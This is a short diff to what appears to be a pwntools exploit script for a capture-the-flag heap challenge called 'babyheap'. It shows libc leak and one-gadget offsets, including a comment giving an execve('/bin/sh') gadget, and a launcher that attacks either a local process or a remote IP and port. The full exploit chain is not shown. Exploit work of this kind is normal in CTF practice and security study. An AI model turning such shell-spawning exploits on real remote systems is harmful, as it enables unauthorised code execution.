@@ -44,6 +44,7 @@ leak_offset = 0x3dac00
 #  [rsp+0x70] == NULL
 one_gadget = 0xe237f
 
+
 # One gadgets -- local libc
 #0x47c46	execve("/bin/sh", rsp+0x30, environ)
 #constraints:
@@ -161,16 +162,15 @@ def main():
 if __name__ == "__main__":
     global r, libc
     if len(sys.argv) == 1:
-        #r = process('./babyheap', env = {'LD_LIBRARY_PATH': os.getcwd()})
-        #cwd = os.getcwd()
+        libc = ELF('./local_libc.so.6')
+        cwd = os.getcwd()
         #r = process('./babyheap', env = {'LD_PRELOAD': cwd + '/ld-2.29.so ' + cwd + '/libc.so'})
         #r = gdb.debug('./babyheap', env = {'LD_PRELOAD': cwd + '/ld-2.29.so ' + cwd + '/libc.so'})
         #r = gdb.debug('./babyheap', gdbscript=gdb_script)
-        libc = ELF('./local_libc.so.6')
         r = process('./babyheap')
     elif len(sys.argv) == 3:
-        r = remote(sys.argv[1], int(sys.argv[2]))
         libc = ELF('./libc.so')
+        r = remote(sys.argv[1], int(sys.argv[2]))
     else:
         print "Usage: %s ip port" % sys.argv[0]
 
